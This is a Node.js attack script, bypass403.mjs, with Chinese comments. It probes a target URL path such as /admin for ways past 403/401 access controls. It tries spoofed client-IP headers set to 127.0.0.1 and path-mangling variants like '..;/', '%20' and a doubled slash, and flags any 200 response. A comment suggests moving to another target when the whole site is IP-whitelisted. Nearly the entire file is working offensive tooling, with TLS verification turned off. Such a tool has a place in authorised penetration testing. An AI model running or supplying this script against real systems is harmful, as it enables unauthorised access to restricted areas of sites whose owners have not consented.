#!/usr/bin/env node
/**
 * bypass403.mjs — 403/401 访问控制绕过矩阵（只读）
 * 用法: node bypass403.mjs https://HOST /admin
 */
import https from 'node:https';
import http from 'node:http';

const [,, HOST, PATH] = process.argv;
if (!HOST || !PATH) { console.error('usage: node bypass403.mjs https://HOST /path'); process.exit(1); }

function req(url, headers = {}, method = 'GET') {
  return new Promise((resolve) => {
    const u = new URL(url);
    const mod = u.protocol === 'https:' ? https : http;
    const r = mod.request({
      hostname: u.hostname, port: u.port || 443, path: u.pathname + u.search, method,
      rejectUnauthorized: false, timeout: 8000,
      headers: { 'User-Agent': 'Mozilla/5.0 Chrome/120.0', ...headers },
    }, (res) => {
      let b = ''; res.setEncoding('utf8');
      res.on('data', d => { if (b.length < 50000) b += d; });
      res.on('end', () => resolve({ status: res.statusCode, len: b.length }));
    });
    r.on('error', () => resolve({ status: 0, len: 0 }));
    r.on('end', () => {});
    r.end();
  });
}

const base = HOST.replace(/\/$/, '');
const headerSets = [
  [{}, 'plain'],
  [{ 'X-Forwarded-For': '127.0.0.1' }, 'XFF local'],
  [{ 'X-Forwarded-For': '127.0.0.1, 8.8.8.8' }, 'XFF chain'],
  [{ 'X-Real-IP': '127.0.0.1' }, 'X-Real-IP'],
  [{ 'Client-IP': '127.0.0.1' }, 'Client-IP'],
  [{ 'X-Originating-IP': '127.0.0.1' }, 'X-Originating-IP'],
  [{ 'X-Remote-Addr': '127.0.0.1' }, 'X-Remote-Addr'],
  [{ 'X-Forwarded-Host': '127.0.0.1' }, 'X-Forwarded-Host'],
];
const pathVariants = [PATH, '//' + PATH.replace(/^\//, ''), '/.' + PATH, PATH + '/', PATH + '/.', PATH + '%20', PATH + '..;/', PATH.toUpperCase()];

console.log('[*] baseline first (static file check tells if whole vhost is IP-whitelisted)');
const fav = await req(base + '/favicon.ico');
console.log('    /favicon.ico -> ' + fav.status + (fav.status === 403 ? '   (全站 403：整站 IP 白名单，换目标)' : ''));

for (const [h, tag] of headerSets) {
  const r = await req(base + PATH, h);
  console.log('[hdr] ' + tag.padEnd(18) + ' -> ' + r.status + ' len=' + r.len + (r.status === 200 ? '   <== CHECK' : ''));
}
for (const p of pathVariants) {
  const r = await req(base + p);
  console.log('[path] ' + p.padEnd(24) + ' -> ' + r.status + ' len=' + r.len + (r.status === 200 ? '   <== CHECK' : ''));
}
console.log('\n[*] done. Only 200 with real content counts; 200 with login page = still protected.');
